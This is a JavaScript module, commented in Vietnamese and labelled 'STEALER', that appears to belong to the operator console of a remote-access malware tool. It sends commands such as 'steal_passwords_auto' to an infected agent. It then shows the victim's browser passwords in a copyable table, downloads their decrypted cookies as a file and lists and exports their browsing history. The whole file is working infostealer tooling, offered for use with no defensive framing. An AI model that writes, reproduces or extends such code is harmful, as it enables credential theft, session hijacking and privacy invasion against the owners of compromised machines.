// =================================================================
// MODULE: STEALER
// Hiển thị mật khẩu, cookies và browser history
// =================================================================

import { state } from '../core/state.js';
import { $ } from '../core/utils.js';
import { downloadBase64File } from '../core/utils.js';

// Store current history data for export
let currentHistoryData = [];
let currentHistoryBrowser = '';
let _sendFn = null;

export function initStealer(sendFunction) {
    _sendFn = sendFunction;

    window.requestAutoStealPasswords = () => {
         if (!state.currentAgentId) return;
        
        console.log("[Stealer] Requesting all passwords...");
        
        _sendFn({ command: 'steal_passwords_auto' });
    };

    window.requestBrowserList = () => {
        if (!state.currentAgentId) return;
        
        _sendFn({ command: 'get_browser_list' });
    };
}

// Thay thế hàm renderPasswordModal trong stealer.js bằng code này:

export function renderPasswordModal(passwords, browserName) {
    state.currentPasswordData = passwords;
    state.currentBrowserName = browserName;
    
    const passwordTbody = document.getElementById('password-list-body');
    const passwordModal = document.getElementById('password-modal');
    const passwordCountLabel = document.getElementById('pass-count');

    if (!passwordTbody || !passwordModal) return;

    passwordTbody.innerHTML = '';
    
    // CẬP NHẬT: Badge trạng thái với chấm xanh (Pulsing Dot)
    passwordCountLabel.innerHTML = `
        <span class="status-dot"></span>
        <span>${passwords.length} items found</span>
    `;

    passwords.forEach((p, index) => {
        const row = document.createElement('tr');
        
        // Cắt ngắn URL thông minh
        const displayUrl = p.url.length > 50 ? p.url.substring(0, 50) + '...' : p.url;
        
        row.innerHTML = `
        <td>
            <a href="${p.url}" target="_blank" class="url-cell" title="${p.url}">
                ${displayUrl}
            </a>
        </td>
        <td>
            <div class="user-cell" title="${p.user}">${p.user}</div>
        </td>
        <td>
            <div class="pass-wrapper">
                <div class="pass-cell" title="Click to copy">${p.pass}</div>
            </div>
        </td>
        <td class="text-center">
            <button class="btn-copy-mac" onclick="handleCopy(${index})" title="Copy Password">
                <i data-feather="copy" style="width: 15px;"></i>
            </button>
        </td>`;
        
        passwordTbody.appendChild(row);
    });

    passwordModal.classList.remove('hidden');
    
    // Gọi Feather Icons để render icon
    if (typeof feather !== 'undefined') feather.replace();
}

export function handleCookiesResult(msg) {
    if (!msg.data || msg.data.length === 0) {
        alert("No cookies found or decryption failed.");
    } else {
        downloadBase64File(btoa(JSON.stringify(msg.data, null, 2)), `cookies_${msg.browser}_${Date.now()}.json`);
        alert(`Success! Downloaded ${msg.data.length} cookies via CDP.`);
    }
}

// Browser List Result Handler
export function handleBrowserListResult(msg) {
    if (!msg.browsers || msg.browsers.length === 0) {
        alert("No browsers detected on target machine.");
        return;
    }
    
    let browserList = "Detected Browsers:\n\n";
    msg.browsers.forEach((b, i) => {
        browserList += `${i + 1}. ${b.name.toUpperCase()}\n`;
    });
    browserList += "\nClick individual browser buttons to extract history.";
    alert(browserList);
}

// Browser History Result Handler - Show in panel instead of download
export function handleBrowserHistoryResult(msg) {
    if (!msg.success) {
        alert("Failed to get browser history: " + (msg.message || "Unknown error"));
        return;
    }
    
    if (!msg.data || msg.data.length === 0) {
        alert(`No history found for ${msg.browser}`);
        return;
    }
    
    // Store for export
    currentHistoryData = msg.data;
    currentHistoryBrowser = msg.browser;
    
    // Update header
    const browserName = $('#history-browser-name');
    const historyCount = $('#history-count');
    if (browserName) browserName.textContent = `${msg.browser.toUpperCase()} History`;
    if (historyCount) historyCount.textContent = `${msg.data.length} items`;
    
    // Render table
    const tbody = $('#history-tbody');
    if (!tbody) return;
    
    tbody.innerHTML = '';
    
    msg.data.forEach((item, index) => {
        const row = document.createElement('tr');
        
        const displayUrl = (item.url || '').length > 55 ? item.url.substring(0, 55) + '...' : (item.url || '');
        const displayTitle = (item.title || '').length > 35 ? item.title.substring(0, 35) + '...' : (item.title || '-');
        
        // Format last visit time
        let lastVisit = item.last_visit || '-';
        if (lastVisit && lastVisit !== '-') {
            try {
                const date = new Date(lastVisit);
                if (!isNaN(date)) {
                    lastVisit = date.toLocaleDateString('vi-VN') + ' ' + date.toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
                }
            } catch(e) {}
        }
        
        row.innerHTML = `
            <td>
                <a href="${item.url || '#'}" target="_blank" title="${item.url || ''}" class="url-link">
                    ${displayUrl}
                </a>
            </td>
            <td style="color: #ccc;" title="${item.title || ''}">${displayTitle}</td>
            <td style="color: #888; text-align: center;">${item.visit_count || 0}</td>
            <td style="color: #666; text-align: right; font-size: 12px;">${lastVisit}</td>
        `;
        
        tbody.appendChild(row);
    });
    
    // Show modal
    $('#history-modal')?.classList.remove('hidden');
    if (typeof feather !== 'undefined') feather.replace();
}

// Export history to CSV
export function exportHistoryCSV() {
    if (!currentHistoryData || currentHistoryData.length === 0) {
        alert('No history data to export');
        return;
    }
    
    let csv = "URL,Title,Visit Count,Last Visit\n";
    currentHistoryData.forEach(item => {
        const url = (item.url || "").replace(/"/g, '""');
        const title = (item.title || "").replace(/"/g, '""');
        csv += `"${url}","${title}",${item.visit_count || 0},"${item.last_visit || ''}"\n`;
    });
    
    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `history_${currentHistoryBrowser}_${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
}

// Close history modal
export function closeHistoryModal() {
    $('#history-modal')?.classList.add('hidden');
}